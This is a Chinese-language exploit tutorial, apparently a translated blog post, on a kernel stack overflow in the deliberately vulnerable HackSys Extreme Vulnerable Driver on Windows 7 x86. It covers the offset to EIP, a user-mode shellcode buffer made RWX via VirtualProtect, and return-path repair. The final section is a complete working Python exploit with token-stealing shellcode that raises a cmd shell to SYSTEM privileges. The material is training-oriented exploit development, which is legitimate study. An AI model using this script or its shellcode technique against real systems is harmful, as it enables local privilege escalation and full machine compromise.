我们可以看到，当机器崩溃时，我们正在执行RET 8，它将从堆栈中弹出一个值到EIP，然后将我们返回到EIP中的地址。
在这个情况下，该地址是0x41414141，该地址未映射，导致我们进入了死亡蓝屏！ 我们知道，一旦有了EIP，我们就有大量的能力来重定向执行流程。
您可以在Kali上的`/usr/bin`中使用`msf-pattern_create`程序来创建3000字节的模式并找到偏移量。
## Exploit
`Pattern`创建的字符可以让我们知道填充无用字符到`EIP`的偏移量是`2080`。接下来的4个字节应该是指向我们的shellcode的指针。
为了在内存中创建缓冲区并将其填充到我们的shellcode中，我们将使用一些`ctypes`函数。
我们需要创建一个字符数组，并用我们的shellcode填充它，这一部分感谢Rootkit的博客。我们将字符数组命名为`usermode_addr`，因为它最终会通知一个指向用户空间的shellcode的指针。
现在，我们的驱动程序正在内核空间中执行，但是我们将在用户空间中创建一个缓冲区，并用我们的shellcode填充它，程序将重定向到该缓冲区，执行完后返回到内核空间，就好像什么都没发生一样。
我们创建缓冲区的代码是：
    shellcode = bytearray(
        "\x90" * 100
        )
    usermode_addr = (c_char * len(shellcode)).from_buffer(shellcode)
我敢肯定，这等效于C语言中的以下内容：
    char usermode_addr[100] = { 0x90, 0x90, ... };
`（c_char * len（shellcode））`意思是说：给我一个`c_char`数组，输入`shellcode`的长度。
`.from_buffer（shellcode）`意思说：用`shellcode`值填充该数组。
我们还必须得到一个指向这个字符数组的指针，这样我们就可以把它放在EIP的位置上。为此，我们可以创建一个名为`ptr`的变量，使其等于`addressof(usermode_addr)`。把这个加到我们的代码中：
    ptr = addressof(usermode_addr)
我们应该能够把这个`ptr`放在我们的利用代码中，并且将执行重定向走到它。但是，我们仍然需要通过读写权限标记该内存区域，否则`DEP`会破它。我们会使用API
`VirtualProtect`（在[这里](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)了解详情）。
如果您想了解有关如何使用此API的更多信息，请阅读我在ROP上的帖子。
我们这部分的代码是：
    result = kernel32.VirtualProtect(
            usermode_addr,
            c_int(len(shellcode)),
            c_int(0x40),
            byref(c_ulong())
        )
`c_int`和`c_ulong`是用于声明这些C数据类型变量的`ctype`函数。`byref()`将返回一个指针（与`byval（）`中的值一样）指向作为其参数的变量。如果该API的返回值不为零，则可以正常工作。
最后，我们将使用`struct.pack("<L",ptr)`适当格式化指针，以便可以将其与我们的shellcode字节数组连接。至此，我们完整的代码如下所示：
    import ctypes, sys, struct
    from ctypes import *
    from subprocess import *
    import time
    kernel32 = windll.kernel32
    def create_file():
        hevd = kernel32.CreateFileA(
            "\\\\.\\HackSysExtremeVulnerableDriver", 
            0xC0000000, 
            0, 
            None, 
            0x3, 
            0, 
            None)
        if (not hevd) or (hevd == -1):
            print("[!] Failed to retrieve handle to device-driver with error-code: " + str(GetLastError()))
            sys.exit(1)
        else:
            print("[*] Successfully retrieved handle to device-driver: " + str(hevd))
            return hevd
    def send_buf(hevd):
        shellcode = bytearray(
        "\x90" * 100
        )
        print("[*] Allocating shellcode character array...")
        usermode_addr = (c_char * len(shellcode)).from_buffer(shellcode)
        ptr = addressof(usermode_addr)
        print("[*] Marking shellcode RWX...")
        result = kernel32.VirtualProtect(
            usermode_addr,
            c_int(len(shellcode)),
            c_int(0x40),
            byref(c_ulong())
        )
        if result != 0:
            print("[*] Successfully marked shellcode RWX.")
        else:
            print("[!] Failed to mark shellcode RWX.")
            sys.exit(1)
        payload = struct.pack("<L",ptr)
        buf = "A" * 2080 + payload
        buf_length = len(buf)
        print("[*] Sending payload to driver...")
        result = kernel32.DeviceIoControl(
            hevd,
            0x222003,
            buf,
            buf_length,
            None,
            0,
            byref(c_ulong()),
            None
        )
    hevd = create_file()
    send_buf(hevd)
由于我们的shellcode只是`NOPs`，而且我们并没有做任何事情来让程序正常执行，因此我们肯定会蓝屏并导致内核崩溃。不过，为了确认我们正在shellcode，让我们继续发送它，我们应该看到`NOP`刚好超过用户空间区分配的缓冲区的末尾。
这些就是NOPs。
现在该处理这次内核崩溃了，当步入`TriggerStackOverflow`函数时，在WinDBG中打印出调试消息显示，复制到内存中的驱动程序幻阵区只有`0x800`字节。我们很可能破坏了一些没有注意到的内存区域。
让我们缩小`payload`的长度刚好为`0x800`(对应十进制的`2048`）大小，然后重新运行。
    buf = "A" * 2048
达到断点后逐步执行，我们会收到调试消息，有效负载是正确大小是`0x800`。
当我们查看反汇编窗格时，可以在接下来的几个图像中看到此突出显示的`ret
8`命令，我们退出`TriggerStackOverflow`函数，然后返回`StackOverflowIoctlHandler`函数。
在该函数内部，我们执行`pop ebp`和`ret 8`。
因为我们劫持了`TriggerStackOverflow`返回后的执行(这是第一个`ret 8`,
为了让它指向我们的shellcode，我们必须模拟这两个操作，分别是`pop ebp`和`ret
8`，我们应该在返回`StackOverflowIoctlHandler`时应该执行这两个操作。)
让我们将这些添加到我们的shellcode中，看看我们是否只能发送NOPs和恢复执行，看看是否可以让受害者继续运行。
我们的新shellcode部分将如下所示：
    shellcode = bytearray(
    "\x90" * 100
    )
    shellcode = shellcode + bytearray(
    "\x5d"                    # pop    ebp
    "\xc2\x08\x00"            # ret    0x8
    )
这次应该就不会让受害者的机器崩溃。我们试试吧。
一切都很好！ 它一直运行着，我们达到了断点，继续使用`g`执行，我们可以看到Debuggee仍在运行并且受害者的机器没有崩溃。
我们剩下要做的就是添加shellcode。
## 最终的漏洞利用代码
我参考了Rootkit博客Shellcode并做了稍微， 我们最终的x86利用代码：
    import ctypes, sys, struct
    from ctypes import *
    from subprocess import *
    import time
    kernel32 = windll.kernel32
    def create_file():
        hevd = kernel32.CreateFileA(
            "\\\\.\\HackSysExtremeVulnerableDriver", 
            0xC0000000, 
            0, 
            None, 
            0x3, 
            0, 
            None)
        if (not hevd) or (hevd == -1):
            print("[!] Failed to retrieve handle to device-driver with error-code: " + str(GetLastError()))
            sys.exit(1)
        else:
            print("[*] Successfully retrieved handle to device-driver: " + str(hevd))
            return hevd
    def send_buf(hevd):
        shellcode = bytearray(
        "\x60"                            # pushad
        "\x31\xc0"                        # xor eax,eax
        "\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
        "\x8b\x40\x50"                    # mov eax,[eax+0x50]
        "\x89\xc1"                        # mov ecx,eax
        "\xba\x04\x00\x00\x00"            # mov edx,0x4
        "\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]
        "\x2d\xb8\x00\x00\x00"            # sub eax,0xb8
        "\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx
        "\x75\xed"                        # jnz 0x1a
        "\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]
        "\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx
        "\x61"                            # popad
        "\x5d"
        "\xc2\x08\x00")
        print("[*] Allocating shellcode character array...")
        usermode_addr = (c_char * len(shellcode)).from_buffer(shellcode)
        ptr = addressof(usermode_addr)
        print("[*] Marking shellcode RWX...")
        result = kernel32.VirtualProtect(
            usermode_addr,
            c_int(len(shellcode)),
            c_int(0x40),
            byref(c_ulong())
        )
        if result != 0:
            print("[*] Successfully marked shellcode RWX.")
        else:
            print("[!] Failed to mark shellcode RWX.")
            sys.exit(1)
        payload = struct.pack("<L",ptr)
        buf = "A" * 2080
        buf += payload
        buf_length = len(buf)
        print("[*] Sending payload to driver...")
        result = kernel32.DeviceIoControl(
            hevd,
            0x222003,
            buf,
            buf_length,
            None,
            0,
            byref(c_ulong()),
            None
        )
        if result != 0:
            print("[*] Payload sent.")
        else:
            print("[!] Unable to send payload to driver.")
            sys.exit(1)
        try:
            print("[*] Spawning cmd shell with SYSTEM privs...")
            Popen(
                'start cmd',
                shell=True
            )
        except:
            print("[!] Failed to spawn cmd shell.")
            sys.exit(1)
    hevd = create_file()
    send_buf(hevd)
在Rootkit的博客上已经对Shellcode进行了很好的解释，请继续阅读并了解它的作用，当我们将漏洞利用移植到x86-64时，我们使用非常相似的Shellcode方法。
## 结论
* * *
这些真是太有趣了。 对我而言，最难的部分是查找有关API调用的文档，查找有关`ctypes`函数的文档，然后尝试遍调试器中的shellcode,
这是开始学习WinDBG的好方法。下篇文章，我们将该漏洞利用移植到有更多功能的Windows 7 x86-64上。